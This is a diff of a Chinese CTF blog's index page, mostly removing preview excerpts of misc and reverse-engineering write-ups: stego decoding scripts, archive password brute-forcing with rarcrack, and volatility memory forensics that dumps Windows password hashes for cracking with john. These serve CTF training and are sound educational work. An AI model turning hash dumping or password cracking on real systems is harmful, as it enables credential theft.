@@ -56,15 +56,15 @@
                 <span class="nav-text">首页</span>
             </a>
         
-            <a class="nav-item" href="/CTF">
+            <a class="nav-item" href="/tags/CTF">
                 <span class="nav-text">CTF</span>
             </a>
         
-            <a class="nav-item" href="/PTE">
+            <a class="nav-item" href="/tags/PTE">
                 <span class="nav-text">渗透</span>
             </a>
         
-            <a class="nav-item" href="/tech">
+            <a class="nav-item" href="/tags/tech">
                 <span class="nav-text">技术力</span>
             </a>
         
@@ -82,7 +82,7 @@
     <aside id="aside" class="aside">
     <div id="aside-mask" class="aside-mask"></div>
     <div id="aside-inner" class="aside-inner">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="https://www.ayanagi.fun"></form>
 
         
         
@@ -140,1223 +140,11 @@
     <header class="article-header">
         
         <h1 itemprop="name">
-            <a href="/2023/12/14/0%E5%9F%BA%E7%A1%80%E7%9A%84Re%E5%9F%BA%E6%93%8D/">0基础的Re基操</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <!-- more --> 
-
-<p>先占坑。不包含基础&#x2F;前置理论知识(算法，汇编之类的，个人喜欢先摸题目，有一定积累之后再切入到理论的理解反而会有柳暗花明与茅塞顿开之感。)<br>学到多少写多少。以题目为例</p>
-<h1 id="1-IDA打开SHIFT-F12查看字符串"><a href="#1-IDA打开SHIFT-F12查看字符串" class="headerlink" title="1.IDA打开SHIFT+F12查看字符串"></a>1.IDA打开SHIFT+F12查看字符串</h1><p>例题：<strong>BUUCTF easyre</strong><br>下载附件拖进IDA，SHIFT+F12呼出Strings Window可以看到flag<br><img src="http://ayanagi.fun/post-images/1615557899074.png"></p>
-
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/2020%E7%BA%B5%E6%A8%AA%E6%9D%AF-Misc-wp-%E5%A4%8D%E7%8E%B0/">2020纵横杯 Misc wp+复现</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>自己只出了签到题。</p>
-<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>自己写的脚本，感觉蛮不错的。<br>写了有一会儿。大概半小时(老菜了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0o146</span>, <span class="number">0o154</span>, <span class="number">0o141</span>, <span class="number">0o147</span>, <span class="number">0o173</span>, <span class="number">0o167</span>, <span class="number">0o63</span>, <span class="number">0o154</span>, <span class="number">0o143</span>, <span class="number">0o157</span>, <span class="number">0o155</span>, <span class="number">0o145</span>, <span class="number">0o137</span>, <span class="number">0o164</span>, <span class="number">0o157</span>, <span class="number">0o137</span>, <span class="number">0o62</span>, <span class="number">0o157</span>, <span class="number">0o156</span>, <span class="number">0o147</span>, <span class="number">0o137</span>, <span class="number">0o150</span>, <span class="number">0o63</span>, <span class="number">0o156</span>, <span class="number">0o147</span>, <span class="number">0o137</span>, <span class="number">0o142</span>, <span class="number">0o145</span>, <span class="number">0o61</span>, <span class="number">0o175</span>]</span><br><span class="line">s2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    s2 += [<span class="built_in">chr</span>((s1[i]))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">    <span class="built_in">print</span>(s2[i],end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="My-Secret"><a href="#My-Secret" class="headerlink" title="My_Secret"></a>My_Secret</h1><p>当时拿到附件一通操作啥也没出来，放弃。<br>通过强队wp复现：<br>首先是lsb隐写，有专门的脚本，叫cloacked-pixel，由于寒假我回了家用台式机重新配的ctf环境，配这个配了好久</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 lsb.py extract stego.png out 123456</span><br><span class="line">cat out</span><br></pre></td></tr></table></figure>
-
-<p>得到密码<code>38d668578a3686ab</code><br>wav音频隐写的话常用的工具是deepsound，得到第二个密码<code>carrier</code>。学习了。<br>接下来图片的加密，看天璇队的wp他们走了不少的弯路，其实无非就是拼积累一个个试呗。希望我能加快积累的速度。<br>使用的是oursecret，一般人根本想不到。</p>
-<h1 id="babymaze2-beta"><a href="#babymaze2-beta" class="headerlink" title="babymaze2_beta"></a>babymaze2_beta</h1><p>该稍微学习一下如何使用nc了，直接下载附件操作会遇到各种各样的问题。nc的话就很方便。</p>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/2020%E7%BA%B5%E6%A8%AA%E6%9D%AF-Misc-wp-%E5%A4%8D%E7%8E%B0/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/2021%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-misc-wp/">2021第六届全国网络空间安全大赛 misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>流量分析是一血，感觉还不错，有些题目有些比较抖机灵的部分吧。</p>
-<h2 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h2><p>附件<code>code.txt</code>，打开是图片的RGB值，稍微修改一下数据令其为<code>R,G,B</code>形式的格式，看了一下有28864行，分解一下，第一次试的是164*176，出来一个乱图，那么换一下xy，脚本如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">176</span>    </span><br><span class="line">y = <span class="number">164</span>    </span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))   </span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;code.txt&#x27;</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  </span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)  </span><br><span class="line">        im.putpixel((i, j), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))  </span><br><span class="line"></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>
-
-<p>得到的flag保存为图片，扔进imagemagick里flop一下</p>
-<p><code>flag&#123;c1d836d1db9d42dd&#125;</code></p>
-<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>爆破，一开始没做出来，先后采用了1-8位纯数字和1-8位大写字母和数字组合，没有尝试小写字母数字组合，后来再试得到密码<code>ff123</code>，解压得到txt文件和加密的文档，txt文件内容得知考点应该是0宽和培根，培根解得文档密码<code>xyj</code>，打开文档复制全部内容解密，发现并不是0宽，在文档里全选修改字体颜色为红色发现flag。<code>flag&#123;cbfacb9df0c7caf9a2b8a8ffbd72d1a0&#125;</code></p>
-<h2 id="Memory-1"><a href="#Memory-1" class="headerlink" title="Memory_1"></a>Memory_1</h2><p>附件<code>val.vmem</code>，在<code>volatility</code>里查看信息</p>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/2021%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-misc-wp/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/ACTF2021Misc-%E5%A4%8D%E7%8E%B0-wp/">ACTF2021Misc 复现&amp;wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>面向新生的一个比赛，但是还是没法都做出来，没有以前笨笨的那股冲劲了，其实还是遇到了瓶颈。</p>
-<h1 id="Real-way"><a href="#Real-way" class="headerlink" title="Real_way"></a>Real_way</h1><p>思路应该是找到和路径文件夹名顺序相同的flag。懒得做了，直接看wp:<br>五层目录，每层目录中有7个文件夹，且每个叶子节点上都有一个 flag.txt 文件，所以总共是16,807 个flag.txt文件夹</p>
-<p>仔细一看就能看出来文件夹的命名都很简单，flag中的密文也很简单，也很有对应关系</p>
-<p>这些个flag文件中只有一个是正确的，何谓正确的呢，就是它密文和它文件所在的路径相同<br>编写脚本如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    m.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Êý¾ÝÁ¿£º&quot;</span>+<span class="built_in">str</span>(m))</span><br><span class="line">strmap=[]</span><br><span class="line">flag_map=[]</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> m:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> m:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> m:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> m:</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> m:</span><br><span class="line">                    temp=i1+<span class="string">&#x27;\\&#x27;</span>+i2+<span class="string">&#x27;\\&#x27;</span>+i3+<span class="string">&#x27;\\&#x27;</span>+i4+<span class="string">&#x27;\\&#x27;</span>+i5</span><br><span class="line">                    strmap.append(temp)</span><br><span class="line">                    temp=i1+i2+i3+i4+i5</span><br><span class="line">                    flag_map.append(temp)</span><br><span class="line"><span class="comment">#print(strmap)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makemap</span>(<span class="params">level,list_map</span>):</span><br><span class="line">    <span class="keyword">if</span> level&gt;<span class="number">0</span>:</span><br><span class="line">        level-=<span class="number">1</span></span><br><span class="line">        makemap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makedir</span>():</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> strmap:</span><br><span class="line">        this=<span class="string">&#x27;D:\\CTF\\QuestsAndWriteUps\\ACTF\\Real_way&#x27;</span></span><br><span class="line">        <span class="comment">#path=os.path.abspath(&#x27;.&#x27;)+&#x27;\\misc_test\\&#x27;+p</span></span><br><span class="line">        path=this+<span class="string">&#x27;\\ACTF\\&#x27;</span>+p</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">        temp=<span class="built_in">open</span>(path+<span class="string">&#x27;\\flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        temp.write(<span class="string">&#x27;actf&#123;&#x27;</span>+flag_map[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(strmap)-<span class="number">1</span>)]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkflag</span>():</span><br><span class="line">    basepath=<span class="string">&#x27;D:\\CTF\\QuestsAndWriteUps\\ACTF\\Real_way&#x27;</span></span><br><span class="line">    <span class="comment">#basepath=os.path.abspath(&#x27;.&#x27;)</span></span><br><span class="line">    ans=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(strmap)):</span><br><span class="line">        path=basepath+<span class="string">&#x27;\\ACTF\\&#x27;</span>+strmap[i]+<span class="string">&#x27;\\flag.txt&#x27;</span></span><br><span class="line">        file=<span class="built_in">open</span>(path,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        flag=file.readline()</span><br><span class="line">        <span class="keyword">if</span> flag_map[i]==flag[<span class="number">5</span>:flag.find(<span class="string">&#x27;&#125;&#x27;</span>)]:</span><br><span class="line">            <span class="comment">#print(flag)</span></span><br><span class="line">            ans.append(flag)</span><br><span class="line">        <span class="comment">#else:</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#print(&#x27;error &#x27; +flag_map[i]+&#x27; : &#x27;+flag[5:flag.find(&#x27;&#125;&#x27;)])</span></span><br><span class="line">            <span class="comment">#print(flag[5:flag.find(&#x27;&#125;&#x27;)])</span></span><br><span class="line">        file.close()</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#makedir()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Ä¿Â¼É¨Ãèing&#x27;</span>)</span><br><span class="line">    ans=checkflag()</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
-
-<h1 id="与熊论道"><a href="#与熊论道" class="headerlink" title="与熊论道"></a>与熊论道</h1><p>解与熊论道，解社会主义核心价值观，得<code>pwd:123456</code>，附件里有bmp，wbs43open解，一分钟就出来的题。ps:和上一题难度差距居然如此之大。<br><code>ACTF&#123;PXY_wants_@_bOyfri3nd&#125;</code></p>
-<h1 id="禁止摸鱼"><a href="#禁止摸鱼" class="headerlink" title="禁止摸鱼"></a>禁止摸鱼</h1><p>扔winhex，尾巴zip，暴力得flag.txt，密码是3位的，而且还是弱口令:<code>123</code>，我从第1位开始爆破的，一瞬间就出了，有师傅从4位密码开始爆，爆了很久都没出。ps:和第一题难度差距竟如此之大。</p>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/ACTF2021Misc-%E5%A4%8D%E7%8E%B0-wp/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/BMZCTF-misc-%E9%9A%8F%E6%89%8B%E9%83%A8%E5%88%86wp/">BMZCTF misc 随手部分wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>刷的时候随手就写了，但是刷着刷着又懒得写了。于是就这样吧</p>
-<h1 id="2018-hackergame-Word-文档"><a href="#2018-hackergame-Word-文档" class="headerlink" title="2018 hackergame Word 文档"></a>2018 hackergame Word 文档</h1><p>直接把文档binwalk了，直接看到<code>flag.txt</code></p>
-<h1 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h1><p>内存镜像文件，题目的描述是：分析内存镜像,破解管理员的登录密码,flag为明文密码的MD5值</p>
-<p>使用volatility</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory imageinfo</span><br></pre></td></tr></table></figure>
-
-<p>先查看镜像的大概信息，发现<code>suggested profile</code>是<code>WinXPSP2x86,WinXPSP3x86 (Instantiated with WinXPSP2x86)</code>使用hashdump命令把内存中所有用户的hash全部dump出来</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory --profile=WinXPSP2x86 hashdump</span><br></pre></td></tr></table></figure>
-
-<p>得到三行类似于shadow一样的密码串，都复制下来保存成1.txt，使用john爆破</p>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/BMZCTF-misc-%E9%9A%8F%E6%89%8B%E9%83%A8%E5%88%86wp/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/C1CTF-2020-Misc-WP/">C1CTF 2020-Misc WP</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <h1 id="BehindMe"><a href="#BehindMe" class="headerlink" title="BehindMe"></a>BehindMe</h1><p>一看就知道是NTFS数据流隐写，盲猜隐藏的文件就是flag.txt<br>直接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad behindme.txt:flag.txt</span><br></pre></td></tr></table></figure>
-
-<h1 id="flag的痛"><a href="#flag的痛" class="headerlink" title="flag的痛"></a>flag的痛</h1><p>音频文件，直接扔audacity，调高频率就能看到flag</p>
-<h1 id="呜呜呜"><a href="#呜呜呜" class="headerlink" title="呜呜呜"></a>呜呜呜</h1><p>winhex打开，尾巴看到7z文件，复制那部分粘贴进010保存或者dd得到一个7zip，ARCHPR无法爆破，搜了一下爆破7z文件的方法，弄了个软件给我爆出来口令是1，但是是错的，之后丢进kali</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarcrack 1.7z --threads 4 --type 7z</span><br></pre></td></tr></table></figure>
-
-<p>放着爆了半天然后挂起了，心态炸了就没去做，看了hint是弱口令，但是也懒得去试，然后没出。<br>一看官方wp其实就是123456，有点遗憾，这么简单的题目都没出来</p>
-<h1 id="forever-c1"><a href="#forever-c1" class="headerlink" title="forever c1"></a>forever c1</h1>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/C1CTF-2020-Misc-WP/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/CTFWshow-DJBCTF%E5%A4%A7%E5%90%89%E6%9D%AF-%E9%83%A8%E5%88%86misc-%E5%A4%8D%E7%8E%B0/">CTFWshow DJBCTF大吉杯 部分misc 复现</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <h1 id="十八般兵器"><a href="#十八般兵器" class="headerlink" title="十八般兵器"></a>十八般兵器</h1><p>hint1: JPHS<br>hint2:用notepad++打开试试？<br>hint3:前十种兵器对应10进制，后八种兵器对应8进制<br>附件是一个rar，解压密码在里面的描述<br>解压之后里面是18张兵器的图片<br>一开始复现的时候芙头芙脑的，按照了文件的顺序去排武器数字，这是第一个坎<br>在题目描述中有正确的顺序：刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙<br>使用JPHS对18张图片解密，密文为空，解密后的18个文件分别丢进winhex，尾部都有一串数字，分两组全部写到记事本里，10进制转16进制，8进制转16进制，转换的过程中找了一些垃圾在线转换网站不支持大数，把我搞迷糊了，最后找到了个很好的在线进制转换，能解决js的大数精度问题，丢连接<a target="_blank" rel="noopener" href="https://tool.lu/hexconvert/">https://tool.lu/hexconvert/</a><br>把两组16进制组合起来转换字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_10_bA_Ban_b1ng_Q1&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="请问大吉杯的签到是在这里签吗"><a href="#请问大吉杯的签到是在这里签吗" class="headerlink" title="请问大吉杯的签到是在这里签吗"></a>请问大吉杯的签到是在这里签吗</h1><p>附件1.png，一个二维码，扫了没什么信息，binwalk，得到2.png，扫，得知是岔路。继续binwalk，到了4.png没了，扫，走到了死胡同。回到2.png，stegsolve滤镜，又得到2幅不同的二维码，扫，都是一样的结果，当时没往下想，果断放弃。(其实是被签到题的200多个解和这道题的个位数个解认为它确实很难而劝退)<br>把这两张二维码保存，使用imagecombine模式 第一个就是XOR就能发现猪圈密码<br>直接出来了<img src="http://ayanagi.fun/post-images/1611664016810.png"></p>
-<h1 id="牛年大吉"><a href="#牛年大吉" class="headerlink" title="牛年大吉"></a>牛年大吉</h1><p>hint1:不要格式化哟，看看引导扇区是不是丢东西了<br>hint2:压缩包密码在图片文件头里<br>一个vhd文件，使用R-Studio装载，恢复出一个7z和一个png<br>png的文件头是<code>89504E47</code>直接得flag</p>
-<h1 id="童话镇"><a href="#童话镇" class="headerlink" title="童话镇"></a>童话镇</h1><p>hint1:离别<br>hint2:思念<br>hint3:爱<br>hint4:印象<br>先binwalk出一个zip，爆破得到2个txt，看不懂。看wp，第二个我遇到的机器学习题目，看来做misc的不会点机器学习还做不下去了。<br>脚本是抄7月师傅的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x_train = []</span><br><span class="line">y_train = []</span><br><span class="line">x_test = []</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;t.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	s = f1.readline()</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	s = s.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	p1 = literal_eval(s.split(<span class="string">&quot;\t&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">	p2 = literal_eval(s.split(<span class="string">&quot;\t&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">	x_train.append(p1)</span><br><span class="line">	x_test.append(p2)</span><br><span class="line">	<span class="comment">#print(x_train)</span></span><br><span class="line">	<span class="comment">#print(x_test)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	s = f2.readline()</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	s = s.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	s = literal_eval(s)</span><br><span class="line">	y_train.append(s)</span><br><span class="line">	<span class="comment">#print(y_train)</span></span><br><span class="line">x_train = np.array(x_train)</span><br><span class="line">y_train = np.array(y_train)</span><br><span class="line">x_test = np.array(x_test)</span><br><span class="line"> </span><br><span class="line">clf = KNeighborsClassifier(n_neighbors = <span class="number">1</span>)</span><br><span class="line">clf.fit(x_train, x_test)</span><br><span class="line">y_test = clf.predict(y_train)</span><br><span class="line"> </span><br><span class="line">f3 = <span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> y_test:</span><br><span class="line">	f3.write(<span class="built_in">str</span>(y_test[i]))</span><br><span class="line">f3.close()</span><br></pre></td></tr></table></figure>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/CTFWshow-DJBCTF%E5%A4%A7%E5%90%89%E6%9D%AF-%E9%83%A8%E5%88%86misc-%E5%A4%8D%E7%8E%B0/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
